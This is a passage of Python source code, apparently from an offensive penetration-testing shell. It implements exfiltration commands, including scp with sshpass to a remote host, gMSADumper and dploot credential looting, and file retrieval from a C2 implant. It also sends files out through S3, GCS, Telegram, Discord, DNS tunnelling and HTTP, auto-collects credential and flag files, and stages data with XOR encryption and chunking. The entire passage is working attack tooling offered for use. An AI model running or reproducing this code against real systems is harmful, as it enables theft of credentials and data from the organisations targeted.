            data = response.json()
            if data.get("status") != GOFILE_OK_STATUS:
                print_error("Upload failed. Please check the response.")
                return
            info = data["data"]
            print_msg("File uploaded successfully!")
            print_msg(f"File ID: {info['id']}")
            print_msg(f"File Name: {info['name']}")
            print_msg(f"File Size: {info['size']} bytes")
            print_msg(f"File Type: {info['mimetype']}")
            print_warn(f"Download Page: {info['downloadPage']}")
            print_msg(f"MD5 Hash: {info['md5']}")
            print_msg(f"Created Time: {info['createTime']}")
            print_msg(f"Modified Time: {info['modTime']}")
        except requests.exceptions.RequestException as error:
            print_error(f"An error occurred: {error}")

    @cmd2.with_category(exfiltration_category)
    def do_rsync(self, line):
        """Push the ``sessions/`` tree to ``rhost`` over SCP with sshpass.

        Args:
            line: Optional alternate source path; defaults to
                ``<self.path>/sessions``.

        Returns:
            None.
        """
        if line:
            tmp_path = line.strip()
        else:
            tmp_path = _sessions_path(self.path)
        credentials_path = os.path.join(self.path, SESSIONS_DIRECTORY_NAME, CREDENTIALS_FILENAME)
        if not os.path.exists(credentials_path):
            username = self.params.get("username") or input("    [!] Enter the username: ")
            password = self.params.get("password") or input("    [!] Enter the password: ")
        else:
            selected = get_users_dic("txt")
            credential = _read_first_credential(selected) if selected else None
            if credential is None:
                username = self.params.get("username") or input("    [!] Enter the username: ")
                password = self.params.get("password") or input("    [!] Enter the password: ")
            else:
                username, password = credential
        rhost = self.params["rhost"]
        print_msg("Deploying sessions directory.")
        rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:{RSYNC_REMOTE_DROP_PATH}"
        print_msg(rsync_command)
        self.cmd(rsync_command)

    @cmd2.with_category(exfiltration_category)
    def do_gmsadumper(self, line):
        """Run gMSADumper to read gMSA password blobs visible to the user.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        gmsadumper_path = os.path.join(self.path, GMSADUMPER_RELATIVE_PATH)
        try:
            if not os.path.exists(gmsadumper_path):
                print_msg("gMSADumper is not installed. Installing...")
                self.cmd(f"git clone {GMSADUMPER_REPOSITORY_URL} {gmsadumper_path}")
            domain = self.params.get("domain")
            subdomain = self.params.get("subdomain")
            ldap_server = f"{subdomain}.{domain}"
            credentials_path = os.path.join(self.path, SESSIONS_DIRECTORY_NAME, CREDENTIALS_FILENAME)
            if not os.path.exists(credentials_path):
                command = f"cd {gmsadumper_path} && python3 gMSADumper.py -k -d {domain} -l {ldap_server}"
            else:
                selected = get_users_dic("txt")
                credential = _read_first_credential(selected) if selected else None
                if credential is None:
                    username = self.params.get("username") or input("    [!] Enter the username: ")
                    password = self.params.get("password") or input("    [!] Enter the password: ")
                else:
                    username, password = credential
                if not domain:
                    print_error("Domain not defined.")
                    domain = input("    [!] Enter the domain: ")
                base = f"cd {gmsadumper_path} && python3 gMSADumper.py -u {username} -p {password} -d {domain}"
                command = f"{base} -l {ldap_server}" if ldap_server else base
            self.cmd(command)
        except Exception as error:
            print_error(f"Error: {error}")

    @cmd2.with_category(exfiltration_category)
    def do_dploot(self, line):
        """Run dploot to loot DPAPI-protected secrets.

        Actions: ``backupkey``, ``blob``, ``browser``, ``certificates``,
        ``credentials``, ``machinecertificates``, ``machinecredentials``,
        ``machinemasterkeys``, ``machinevaults``, ``masterkeys``,
        ``mobaxterm``, ``rdg``, ``sccm``, ``vaults``, ``wam``, ``wifi``.

        Args:
            line: First token is the action; missing input prompts for it.

        Returns:
            None.
        """
        dploot_path = os.path.join(self.path, DPLOOT_RELATIVE_PATH)
        try:
            if not os.path.exists(dploot_path):
                print_msg("dploot is not installed. Installing...")
                self.cmd(f"git clone {DPLOOT_REPOSITORY_URL} {dploot_path}")
                self.cmd(f"cd {dploot_path} && pipx install .")
            action = line.split()[0] if line else (input(DPLOOT_ACTION_PROMPT) or DPLOOT_DEFAULT_ACTION)
            rhost = self.params.get("rhost")
            domain = self.params.get("domain")
            credentials_path = os.path.join(self.path, SESSIONS_DIRECTORY_NAME, CREDENTIALS_FILENAME)
            if not os.path.exists(credentials_path):
                username = self.params.get("username") or input("    [!] Enter the username: ")
                password = self.params.get("password") or input("    [!] Enter the password: ")
            else:
                selected = get_users_dic("txt")
                credential = _read_first_credential(selected) if selected else None
                if credential is None:
                    username = self.params.get("username") or input("    [!] Enter the username: ")
                    password = self.params.get("password") or input("    [!] Enter the password: ")
                else:
                    username, password = credential
                if not domain:
                    print_error("Domain not defined.")
                    domain = input("    [!] Enter the domain: ")
            command = f"dploot {action} -d {domain} -u {username} -p '{password}' -t {rhost} "
            args = self._resolve_dploot_args(action, domain)
            if args is None:
                return
            self.cmd(f"{command} {args}")
        except Exception as error:
            print_error(f"Error: {error}")

    def _resolve_dploot_args(self, action: str, domain: str) -> str | None:
        """Return the tail arguments matching a dploot action.

        Args:
            action: dploot subcommand name selected by the operator.
            domain: Target Active Directory domain (used for ``.mkf``).

        Returns:
            The argument suffix to append to the dploot command, or
            ``None`` when the action is unknown (and an error was
            already printed).
        """
        sessions_root = _sessions_path(self.path)
        if action == "backupkey":
            return " -quiet"
        if action == "blob":
            blob = input("    [!] Enter the blob: ") or DPLOOT_DEFAULT_BLOB
            return f" -pvk key.pvk -blob '{blob}' "
        if action == "browser":
            return f" -mkfile {sessions_root}/masterkeys"
        if action in DPLOOT_MKFILE_ACTIONS:
            return f" -mkfile {domain}.mkf"
        if action in DPLOOT_NO_ARG_ACTIONS:
            return " "
        if action in DPLOOT_PVK_KEY_ACTIONS:
            return " -pvk key.pvk"
        if action == "masterkeys":
            choice = input("    [!] Enter 1 to domain backupkey or 2 with credentials") or "1"
            if choice == "1":
                return " -pvk key.pvk"
            credentials = get_credentials(True)
            return f" -passwords {credentials}"
        print_error("Action not found. Please use help dploot to view available options.")
        return None

    @cmd2.with_category(exfiltration_category)
    def download_file_from_c2(self, file_name, clientid=""):
        """Download a file from the C2 implant upload queue.

        Posts an ``upload:<file_name>`` command to the implant identified
        by ``clientid`` and writes the response body under
        ``sessions/temp_uploads/<file_name>``.

        Args:
            file_name: Remote filename relative to the implant's working
                directory.
            clientid: Implant identifier. Empty input prompts the
                operator with the current ``c2_clientid`` as default.

        Returns:
            None.
        """
        if clientid == "":
            prompt = f"    [!] Enter the client id (default {self.c2_clientid}): "
            clientid = input(prompt) or self.c2_clientid
        sessions_root = _sessions_path(self.path)
        target_directory = os.path.join(sessions_root, "temp_uploads")
        file_name = os.path.basename(file_name)
        output_path = os.path.join(target_directory, file_name)
        command = f"upload:{file_name}"
        data = {"client_id": clientid, "command": command}
        response = requests.post(
            f"{self.c2_url}/issue_command",
            auth=self.c2_auth,
            data=data,
            verify=False,  # noqa: S501
        )
        if response.status_code == 200:
            with open(output_path, "wb") as handle:
                handle.write(response.content)
            print_msg(f"File {file_name} downloaded successfully.")
        else:
            print_error(f"Failed to download file {file_name}. Status code: {response.status_code}")

    @cmd2.with_category(exfiltration_category)
    def do_download_c2(self, line):
        """Download a file from the C2 implant via the upload command.

        Args:
            line: Remote path of the file to download. An empty input
                returns an error matching the live ``LazyOwnShell``
                behaviour.

        Returns:
            None.
        """
        if not line:
            print_error("Need pass the remote path to file to use this command example: download_c2 /root/root.txt")
            return
        self.download_file_from_c2(line)

    @cmd2.with_category(exfiltration_category)
    def do_exfil_s3(self, line):
        """Upload a file to an AWS S3 bucket.

        Usage: exfil_s3 <file_path> --bucket <name> --key <access_key> --secret <secret_key> [--region <region>] [--prefix <prefix>]

        Requires boto3 to be installed. Falls back to a presigned-URL
        approach using requests when boto3 is not available.
        """
        args = shlex.split(line)
        if len(args) < 1:
            print_error(
                "Usage: exfil_s3 <file_path> --bucket <name> --key <access_key> --secret <secret_key> [--region <region>]"
            )
            return

        file_path = args[0]
        bucket = _extract_flag(args, "--bucket")
        access_key = _extract_flag(args, "--key")
        secret_key = _extract_flag(args, "--secret")
        region = _extract_flag(args, "--region") or "us-east-1"
        prefix = _extract_flag(args, "--prefix") or ""

        if not all([bucket, access_key, secret_key]):
            print_error("Missing required flags: --bucket, --key, --secret")
            return

        if not os.path.exists(file_path):
            print_error(f"File not found: {file_path}")
            return

        object_key = prefix + os.path.basename(file_path)

        try:
            import boto3

            s3 = boto3.client("s3", aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)
            s3.upload_file(file_path, bucket, object_key)
            print_msg(f"Uploaded {file_path} to s3://{bucket}/{object_key}")
        except ImportError:
            print_warn("boto3 not installed, using presigned URL approach")
            _upload_s3_presigned(file_path, bucket, object_key, access_key, secret_key, region)
        except Exception as e:
            print_error(f"S3 upload failed: {e}")

    @cmd2.with_category(exfiltration_category)
    def do_exfil_telegram(self, line):
        """Exfiltrate a file via Telegram Bot API.

        Usage: exfil_telegram <file_path> --token <bot_token> --chat <chat_id>

        The file is sent as a document to the specified Telegram chat.
        Files larger than 50MB are automatically split into chunks.
        """
        args = shlex.split(line)
        if len(args) < 1:
            print_error("Usage: exfil_telegram <file_path> --token <bot_token> --chat <chat_id> [--caption <text>]")
            return

        file_path = args[0]
        bot_token = _extract_flag(args, "--token")
        chat_id = _extract_flag(args, "--chat")
        caption = _extract_flag(args, "--caption") or os.path.basename(file_path)

        if not all([bot_token, chat_id]):
            print_error("Missing required flags: --token, --chat")
            return

        if not os.path.exists(file_path):
            print_error(f"File not found: {file_path}")
            return

        file_size = os.path.getsize(file_path)
        if file_size <= TELEGRAM_MAX_SIZE:
            _send_telegram_file(file_path, bot_token, chat_id, caption)
        else:
            print_msg("File exceeds 50MB, splitting into chunks...")
            chunk_dir = tempfile.mkdtemp(prefix="lazyexfil_")
            try:
                _split_file(file_path, chunk_dir, TELEGRAM_MAX_SIZE)
                chunks = sorted(os.listdir(chunk_dir))
                for idx, chunk_name in enumerate(chunks):
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    chunk_caption = f"{caption} [{idx + 1}/{len(chunks)}]"
                    _send_telegram_file(chunk_path, bot_token, chat_id, chunk_caption)
                    time.sleep(1)
                print_msg(f"Sent {len(chunks)} chunks via Telegram")
            finally:
                shutil.rmtree(chunk_dir, ignore_errors=True)

    @cmd2.with_category(exfiltration_category)
    def do_exfil_discord(self, line):
        """Exfiltrate a file via Discord webhook.

        Usage: exfil_discord <file_path> --webhook <webhook_url>

        Files larger than 25MB are automatically split into chunks.
        """
        args = shlex.split(line)
        if len(args) < 1:
            print_error("Usage: exfil_discord <file_path> --webhook <webhook_url> [--name <filename>]")
            return

        file_path = args[0]
        webhook_url = _extract_flag(args, "--webhook")
        custom_name = _extract_flag(args, "--name") or os.path.basename(file_path)

        if not webhook_url:
            print_error("Missing required flag: --webhook")
            return

        if not os.path.exists(file_path):
            print_error(f"File not found: {file_path}")
            return

        file_size = os.path.getsize(file_path)
        if file_size <= DISCORD_MAX_SIZE:
            _send_discord_file(file_path, webhook_url, custom_name)
        else:
            print_msg("File exceeds 25MB, splitting into chunks...")
            chunk_dir = tempfile.mkdtemp(prefix="lazyexfil_")
            try:
                _split_file(file_path, chunk_dir, DISCORD_MAX_SIZE)
                chunks = sorted(os.listdir(chunk_dir))
                for idx, chunk_name in enumerate(chunks):
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    chunk_label = f"{custom_name}.part{idx + 1:03d}"
                    _send_discord_file(chunk_path, webhook_url, chunk_label)
                    time.sleep(1)
                print_msg(f"Sent {len(chunks)} chunks via Discord")
            finally:
                shutil.rmtree(chunk_dir, ignore_errors=True)

    @cmd2.with_category(exfiltration_category)
    def do_exfil_gcs(self, line):
        """Upload a file to Google Cloud Storage.

        Usage: exfil_gcs <file_path> --bucket <name> --key <access_key_json_path>

        The --key flag expects the path to a GCP service account JSON file.
        """
        args = shlex.split(line)
        if len(args) < 1:
            print_error("Usage: exfil_gcs <file_path> --bucket <name> --key <json_key_path> [--prefix <path>]")
            return

        file_path = args[0]
        bucket = _extract_flag(args, "--bucket")
        key_path = _extract_flag(args, "--key")
        prefix = _extract_flag(args, "--prefix") or ""

        if not all([bucket, key_path]):
            print_error("Missing required flags: --bucket, --key")
            return

        if not os.path.exists(file_path):
            print_error(f"File not found: {file_path}")
            return

        if not os.path.exists(key_path):
            print_error(f"Service account key not found: {key_path}")
            return

        try:
            from google.cloud import storage

            client = storage.Client.from_service_account_json(key_path)
            blob = client.bucket(bucket).blob(prefix + os.path.basename(file_path))
            blob.upload_from_filename(file_path)
            print_msg(f"Uploaded {file_path} to gs://{bucket}/{blob.name}")
        except ImportError:
            print_error("google-cloud-storage required. Install: pip install google-cloud-storage")
        except Exception as e:
            print_error(f"GCS upload failed: {e}")

    @cmd2.with_category(exfiltration_category)
    def do_exfil_dns(self, line):
        """Exfiltrate data via DNS tunneling.

        Usage: exfil_dns <file_path> --domain <dns_domain> [--server <dns_server>]

        Encodes file content as Base32 hex and sends via DNS A-record queries.
        Requires a cooperating DNS server that logs queries.
        """
        args = shlex.split(line)
        if len(args) < 1:
            print_error("Usage: exfil_dns <file_path> --domain <dns_domain> [--server <dns_server>]")
            return

        file_path = args[0]
        domain = _extract_flag(args, "--domain")
        dns_server = _extract_flag(args, "--server") or "8.8.8.8"

        if not domain:
            print_error("Missing required flag: --domain")
            return

        if not os.path.exists(file_path):
            print_error(f"File not found: {file_path}")
            return

        try:
            data = open(file_path, "rb").read()
            file_hash = hashlib.sha256(data).hexdigest()[:8]
            compressed = gzip.compress(data, compresslevel=9)
            encoded = base64.b32hexencode(compressed).decode().rstrip("=").lower()
            chunks = [encoded[i : i + DNS_CHUNK_SIZE] for i in range(0, len(encoded), DNS_CHUNK_SIZE)]
            total = len(chunks)

            import dns.resolver

            resolver = dns.resolver.Resolver()
            resolver.nameservers = [dns_server]

            for idx, chunk in enumerate(chunks):
                query = f"{file_hash}.{idx:04d}.{total:04d}.{chunk}.{domain}"
                if len(query) > 253:
                    print_warn(f"Query too long ({len(query)} chars), skipping chunk {idx}")
                    continue
                try:
                    resolver.resolve(query, "A")
                except Exception:
                    pass  # expected - DNS server won't resolve unknown names
                if (idx + 1) % 50 == 0:
                    print_msg(f"  Sent {idx + 1}/{total} DNS queries")
                time.sleep(0.1)

            print_msg(f"Exfiltrated {file_path} via {total} DNS queries to {domain}")
            print_msg(f"Reassembly: hash={file_hash}, chunks={total}, encoding=base32+gzip")
        except ImportError:
            print_error("dnspython required. Install: pip install dnspython")
        except Exception as e:
            print_error(f"DNS exfil failed: {e}")

    @cmd2.with_category(exfiltration_category)
    def do_exfil_http(self, line):
        """Exfiltrate a file via HTTP POST to a controlled server.

        Usage: exfil_http <file_path> --url <upload_url> [--param <field_name>] [--chunked] [--ssl false]

        Posts the file as multipart form data. With --chunked, splits and
        sends in chunks with sequence headers for reassembly.
        """
        args = shlex.split(line)
        if len(args) < 1:
            print_error("Usage: exfil_http <file_path> --url <upload_url> [--param <field_name>] [--chunked]")
            return

        file_path = args[0]
        upload_url = _extract_flag(args, "--url")
        field_name = _extract_flag(args, "--param") or "file"
        use_chunked = "--chunked" in args
        use_ssl = _extract_flag(args, "--ssl") != "false"

        if not upload_url:
            print_error("Missing required flag: --url")
            return

        if not os.path.exists(file_path):
            print_error(f"File not found: {file_path}")
            return

        if not upload_url.startswith("http"):
            upload_url = f"{'https' if use_ssl else 'http'}://{upload_url}"

        try:
            if use_chunked:
                file_size = os.path.getsize(file_path)
                total_chunks = (file_size + EXFIL_CHUNK_SIZE - 1) // EXFIL_CHUNK_SIZE
                file_hash = hashlib.sha256(open(file_path, "rb").read()).hexdigest()
                file_name = os.path.basename(file_path)

                with open(file_path, "rb") as f:
                    for idx in range(total_chunks):
                        chunk = f.read(EXFIL_CHUNK_SIZE)
                        headers = {
                            "X-Chunk-Index": str(idx),
                            "X-Chunk-Total": str(total_chunks),
                            "X-File-Name": file_name,
                            "X-File-Hash": file_hash,
                        }
                        resp = requests.post(
                            upload_url,
                            files={field_name: (f"{file_name}.part{idx:04d}", chunk)},
                            headers=headers,
                            timeout=30,
                        )
                        if resp.status_code not in (200, 201, 204):
                            print_error(f"Chunk {idx} failed: HTTP {resp.status_code}")
                            return
                        if (idx + 1) % 10 == 0:
                            print_msg(f"  Sent chunk {idx + 1}/{total_chunks}")

                print_msg(f"Exfiltrated {file_path} via {total_chunks} HTTP POST chunks")
            else:
                with open(file_path, "rb") as f:
                    resp = requests.post(upload_url, files={field_name: (os.path.basename(file_path), f)}, timeout=60)
                if resp.status_code in (200, 201, 204):
                    print_msg(f"Uploaded {file_path} to {upload_url}")
                else:
                    print_error(f"Upload failed: HTTP {resp.status_code}")
        except requests.RequestException as e:
            print_error(f"HTTP exfil failed: {e}")

    @cmd2.with_category(exfiltration_category)
    def do_exfil_auto(self, line):
        """Auto-detect flags and sensitive files, then exfiltrate.

        Usage: exfil_auto --method <telegram|discord|s3|gcs|http|gofile> [method flags...]

        Scans common flag locations (root.txt, user.txt, /home/*/user.txt,
        /root/root.txt, C:\\Users\\*\\Desktop\\*.txt) and exfiltrates them.
        Supports all exfil_* --flags for the selected method.
        """
        args = shlex.split(line)
        method = _extract_flag(args, "--method") or "gofile"

        if method not in ("telegram", "discord", "s3", "gcs", "http", "gofile"):
            print_error(f"Unknown method: {method}. Use: telegram, discord, s3, gcs, http, gofile")
            return

        flag_locations = [
            "sessions/root.txt",
            "sessions/user.txt",
            "sessions/credentials.txt",
            "sessions/credentials*.txt",
            "sessions/hash.txt",
            "sessions/users.txt",
        ]

        import glob as glob_mod

        found = []
        for pattern in flag_locations:
            for match in glob_mod.glob(pattern):
                if os.path.isfile(match) and match not in found:
                    found.append(match)

        if not found:
            print_warn("No flag files found in sessions/")
            return

        print_msg(f"Found {len(found)} files to exfiltrate via {method}")
        for file_path in found:
            print_msg(f"  Exfiltrating: {file_path}")
            cmd_line = f"exfil_{method} {file_path} " + " ".join(
                args[args.index("--method") + 2 :] if "--method" in args else []
            )
            # Re-invoke the appropriate do_ method
            method_map = {
                "telegram": self.do_exfil_telegram,
                "discord": self.do_exfil_discord,
                "s3": self.do_exfil_s3,
                "gcs": self.do_exfil_gcs,
                "http": self.do_exfil_http,
                "gofile": self.do_upload_gofile,
            }
            handler = method_map.get(method)
            if handler:
                handler_line = file_path + " " + " ".join(a for a in args if a not in ("--method", method))
                handler(handler_line)

    @cmd2.with_category(exfiltration_category)
    def do_stage(self, line):
        """Stage data for exfiltration: compress, encrypt, and split.

        Usage: stage <file_or_directory> [--encrypt <key>] [--split <size_mb>] [--output <dir>]

        Creates a staged package: gzip compress -> optional XOR encrypt -> split into chunks.
        Outputs a manifest.json with reassembly instructions.
        """
        args = shlex.split(line)
        if len(args) < 1:
            print_error("Usage: stage <file_or_directory> [--encrypt <key>] [--split <size_mb>] [--output <dir>]")
            return

        target = args[0]
        encrypt_key = _extract_flag(args, "--encrypt")
        split_size_mb = int(_extract_flag(args, "--split") or "0")
        output_dir = _extract_flag(args, "--output") or "sessions/staged"

        if not os.path.exists(target):
            print_error(f"Target not found: {target}")
            return

        os.makedirs(output_dir, exist_ok=True)
        timestamp = int(time.time())

        if os.path.isdir(target):
            archive_path = os.path.join(output_dir, f"stage_{timestamp}.zip")
            with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for root, _, files in os.walk(target):
                    for f in files:
                        fp = os.path.join(root, f)
                        zf.write(fp, os.path.relpath(fp, os.path.dirname(target)))
            data = open(archive_path, "rb").read()
            os.remove(archive_path)
        else:
            data = open(target, "rb").read()

        compressed = gzip.compress(data, compresslevel=STAGE_COMPRESS_LEVEL)
        original_hash = hashlib.sha256(data).hexdigest()
        compressed_hash = hashlib.sha256(compressed).hexdigest()

        if encrypt_key:
            compressed = xor_encrypt_decrypt(compressed, encrypt_key)

        size_mb = len(compressed) / (1024 * 1024)
        print_msg(f"Staged: {os.path.basename(target)} -> {size_mb:.1f}MB compressed")

        manifest = {
            "target": os.path.basename(target),
            "original_size": len(data),
            "compressed_size": len(compressed),
            "original_hash": original_hash,
            "compressed_hash": compressed_hash,
            "encrypted": bool(encrypt_key),
            "timestamp": timestamp,
            "format": "gzip",
        }

        if split_size_mb > 0:
            chunk_size = split_size_mb * 1024 * 1024
            total_chunks = (len(compressed) + chunk_size - 1) // chunk_size
            manifest["chunks"] = total_chunks
            manifest["chunk_size"] = chunk_size
            base_name = f"stage_{timestamp}"
            for idx in range(total_chunks):
                chunk = compressed[idx * chunk_size : (idx + 1) * chunk_size]
                chunk_path = os.path.join(output_dir, f"{base_name}.part{idx:04d}")
                with open(chunk_path, "wb") as f:
                    f.write(chunk)
            print_msg(f"Split into {total_chunks} chunks in {output_dir}")
        else:
            output_path = os.path.join(output_dir, f"stage_{timestamp}.gz")
            if encrypt_key:
                output_path += ".enc"
            with open(output_path, "wb") as f:
                f.write(compressed)
            manifest["output"] = output_path
            print_msg(f"Saved to {output_path}")

        manifest_path = os.path.join(output_dir, f"manifest_{timestamp}.json")
        with open(manifest_path, "w") as f:
            json.dump(manifest, f, indent=2)
        print_msg(f"Manifest saved to {manifest_path}")


__all__ = ["ExfiltrationCommandSet"]
